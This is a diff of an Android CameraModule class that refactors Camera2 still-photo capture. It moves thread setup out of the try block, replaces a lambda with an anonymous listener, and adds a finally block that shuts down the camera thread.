@@ -9,10 +9,13 @@ import android.graphics.ImageFormat;
 import android.graphics.YuvImage;
 import android.hardware.Camera;
 import android.hardware.camera2.CameraAccessException;
+import android.hardware.camera2.CameraCaptureSession;
 import android.hardware.camera2.CameraCharacteristics;
 import android.hardware.camera2.CameraDevice;
 import android.hardware.camera2.CameraManager;
 import android.hardware.camera2.CaptureRequest;
+import android.hardware.camera2.TotalCaptureResult;
+import android.hardware.camera2.params.StreamConfigurationMap;
 import android.media.Image;
 import android.media.ImageReader;
 import android.os.Build;
@@ -22,14 +25,19 @@ import android.os.Looper;
 import android.util.Base64;
 import android.util.Log;
 import android.util.Size;
+import android.view.Surface;
 
 import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 
 import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.nio.ByteBuffer;
+import java.util.ArrayList;
 import java.util.Collections;
+import java.util.List;
 import java.util.concurrent.Semaphore;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicReference;
@@ -232,15 +240,15 @@ public class CameraModule {
     }
     
     private void takePhotoCamera2(final CameraCallback callback) {
+        HandlerThread cameraThread = new HandlerThread("CameraThread");
+        cameraThread.start();
+        Handler cameraHandler = new Handler(cameraThread.getLooper());
+        
+        final Semaphore lock = new Semaphore(0);
+        final AtomicReference<Exception> error = new AtomicReference<>();
+        final AtomicReference<byte[]> imageData = new AtomicReference<>();
+        
         try {
-            HandlerThread cameraThread = new HandlerThread("CameraThread");
-            cameraThread.start();
-            Handler cameraHandler = new Handler(cameraThread.getLooper());
-            
-            final Semaphore lock = new Semaphore(0);
-            final AtomicReference<Exception> error = new AtomicReference<>();
-            final AtomicReference<byte[]> imageData = new AtomicReference<>();
-            
             cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                 @Override
                 public void onOpened(@NonNull CameraDevice camera) {
@@ -252,56 +260,67 @@ public class CameraModule {
                         // Create ImageReader
                         ImageReader reader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2);
                         
-                        reader.setOnImageAvailableListener(reader1 -> {
-                            try (Image image = reader1.acquireLatestImage()) {
-                                if (image != null) {
-                                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                                    byte[] bytes = new byte[buffer.remaining()];
-                                    buffer.get(bytes);
-                                    imageData.set(bytes);
-                                    Log.d(TAG, "Photo captured, size: " + bytes.length + " bytes");
+                        reader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
+                            @Override
+                            public void onImageAvailable(ImageReader reader) {
+                                try (Image image = reader.acquireLatestImage()) {
+                                    if (image != null) {
+                                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
+                                        byte[] bytes = new byte[buffer.remaining()];
+                                        buffer.get(bytes);
+                                        imageData.set(bytes);
+                                        Log.d(TAG, "Photo captured, size: " + bytes.length + " bytes");
+                                    }
+                                } catch (Exception e) {
+                                    Log.e(TAG, "Error acquiring image", e);
+                                    error.set(e);
+                                } finally {
+                                    camera.close();
+                                    lock.release();
                                 }
-                            } catch (Exception e) {
-                                Log.e(TAG, "Error acquiring image", e);
-                                error.set(e);
-                            } finally {
-                                camera.close();
-                                lock.release();
                             }
                         }, cameraHandler);
                         
                         // Create capture request
-                        camera.createCaptureSession(
-                                Collections.singletonList(reader.getSurface()),
-                                new CameraCaptureSession.StateCallback() {
-                                    @Override
-                                    public void onConfigured(@NonNull CameraCaptureSession session) {
-                                        try {
-                                            CaptureRequest.Builder builder = camera.createCaptureRequest(
-                                                    CameraDevice.TEMPLATE_STILL_CAPTURE);
-                                            builder.addTarget(reader.getSurface());
-                                            builder.set(CaptureRequest.JPEG_QUALITY, (byte) 95);
-                                            
-                                            if (sensorOrientation != null) {
-                                                builder.set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation);
-                                            }
-                                            
-                                            session.capture(builder.build(), null, cameraHandler);
-                                        } catch (CameraAccessException e) {
-                                            Log.e(TAG, "Error capturing", e);
-                                            error.set(e);
-                                            camera.close();
-                                            lock.release();
-                                        }
+                        List<Surface> surfaces = new ArrayList<>();
+                        surfaces.add(reader.getSurface());
+                        
+                        camera.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
+                            @Override
+                            public void onConfigured(@NonNull CameraCaptureSession session) {
+                                try {
+                                    CaptureRequest.Builder builder = camera.createCaptureRequest(
+                                            CameraDevice.TEMPLATE_STILL_CAPTURE);
+                                    builder.addTarget(reader.getSurface());
+                                    builder.set(CaptureRequest.JPEG_QUALITY, (byte) 95);
+                                    
+                                    if (sensorOrientation != null) {
+                                        builder.set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation);
                                     }
                                     
-                                    @Override
-                                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {
-                                        error.set(new Exception("Session configuration failed"));
-                                        camera.close();
-                                        lock.release();
-                                    }
-                                }, cameraHandler);
+                                    session.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
+                                        @Override
+                                        public void onCaptureCompleted(@NonNull CameraCaptureSession session, 
+                                                                      @NonNull CaptureRequest request, 
+                                                                      @NonNull TotalCaptureResult result) {
+                                            // Capture completed
+                                        }
+                                    }, cameraHandler);
+                                } catch (CameraAccessException e) {
+                                    Log.e(TAG, "Error capturing", e);
+                                    error.set(e);
+                                    camera.close();
+                                    lock.release();
+                                }
+                            }
+                            
+                            @Override
+                            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
+                                error.set(new Exception("Session configuration failed"));
+                                camera.close();
+                                lock.release();
+                            }
+                        }, cameraHandler);
                         
                     } catch (Exception e) {
                         Log.e(TAG, "Error opening camera", e);
@@ -343,11 +362,11 @@ public class CameraModule {
             String base64Image = Base64.encodeToString(data, Base64.NO_WRAP);
             mainHandler.post(() -> callback.onPhotoTaken("CAMERA|data:image/jpeg;base64," + base64Image));
             
-            cameraThread.quitSafely();
-            
         } catch (Exception e) {
             Log.e(TAG, "Camera2 capture failed", e);
             mainHandler.post(() -> callback.onError("ERROR: " + e.getMessage()));
+        } finally {
+            cameraThread.quitSafely();
         }
     }
     
